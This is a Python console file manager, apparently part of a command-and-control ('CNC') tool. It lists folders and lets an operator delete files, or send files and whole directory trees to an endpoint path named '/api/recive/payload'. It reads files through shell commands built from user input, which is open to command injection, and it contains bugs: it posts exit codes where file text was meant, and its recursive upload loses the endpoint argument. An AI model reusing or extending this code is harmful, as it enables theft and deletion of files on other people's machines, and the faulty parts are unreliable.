import os,time
import tkinter.filedialog as fd
import requests
import os.path as path
from pprint import pprint
import colorama 
import platform
from tabulate import tabulate
from colorama import Fore,Style
colorama.init()


def writetofile(error:str):
        with open("erors.txt",'a',encoding='utf-8')as e:
            e.write(str(error)+"\n")



class FileDialog:
    def __init__(self):
        self.commands =[["[file] --remove","deletes the selected file"],["[file] --read","prints the contents of the file"],["[file] --upload",'uploads the selected file to your machine']]


    def removefile(self,filepath):
        try:
                os.remove(filepath)
                print(Fore.GREEN+f"[CNC]:removed file {filepath} successfully")
        except Exception as e:
            writetofile(e)

    def uploadfile(self,filepath,ENDPOINT):
        try:
            if os.path.isfile(filepath):
                try:
                    with open(filepath,"rb") as b:
                        r = requests.post(f"{ENDPOINT}/api/recive/payload",files={"File_param":b})
                        if r.status_code == 200:
                            print(Fore.GREEN+f"[CNC]:file {filepath} Is being uploaded or uploaded")
                except Exception as e:
                    writetofile(e)
        except Exception as e:
                    writetofile(e)

    def manageupload(self,filepath,ENDPOINT):
        try:    
            if path.isdir(filepath):
                r = input("this will upload all file and subdirs in the directory that you selected do you want to proceed [y,n]?").lower()
                if r =='y':
                    for file in os.listdir(filepath):
                        floader = path.join(filepath,file)
                        self.manageupload(floader)
            else:
                self.uploadfile(filepath,ENDPOINT)

        except Exception as e:
            writetofile(e)

    def readfile(self,ENDPOINT,filepath):
        try:
            if platform.system() == "Linux":
                text = (os.system(f"cat {filepath}"))
            elif platform.system() == "Windows":
                text = (os.system(f"type {filepath}"))


            data = {
                "data":text,
                "file_name":filepath
                }
            
            r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
            print(r.status_code)
        except Exception as e:
            writetofile(e)

    def dostufftofile(self,base,filepath,cmd,endpoint=None):
        if cmd == "remove":
            self.removefile(filepath=filepath)


        elif cmd == "upload" and endpoint != None:
            self.manageupload(filepath=filepath,ENDPOINT=endpoint)

        elif cmd == "read":
            self.readfile(endpoint,filepath)
        elif cmd == "walk":
            if path.isdir(filepath):
                self.searchfiles(filepath)
            else:
                print("you cant walk a file it must be a dir")
                time.sleep(2)
                self.searchfiles(base)

            


    

    def searchfiles(self,folder_path):
        try:
            Files = {}
            data = []
            for file_or_folder in os.listdir(folder_path):
                floder =path.join(folder_path ,file_or_folder)
                file_type = "File" if os.path.isfile(floder) else "Folder"
                if file_type == "File":
                    Files[file_or_folder] = "File"
                    data.append([Fore.RED +file_or_folder+ Style.RESET_ALL, Fore.RED + file_type + Style.RESET_ALL])        
                else:
                    Files[file_or_folder] = "Folder "
                    data.append([Fore.BLUE + floder + Style.RESET_ALL, Fore.BLUE + file_type + Style.RESET_ALL])        

            table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
            print(table)

            inp = input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: ")
            try:
                cmd = inp.split("--")[1]
            except:
                print("You have to add a Command")
            filename = inp.split("--")[0].strip(" ")
            floder =path.join(folder_path ,filename)
            print(f"CMD:{cmd} || filepath:{floder} || ENDPOINT:'http://127.0.0.1:8000'")
            self.dostufftofile(base=folder_path,cmd=cmd,filepath=floder,endpoint="http://127.0.0.1:8000")
            
        

        except Exception as e:
            writetofile(e)                
                    

#print(fd.askdirectory())




    
APP = FileDialog()
APP.searchfiles('/home/iq/Desktop/code/Siteophile')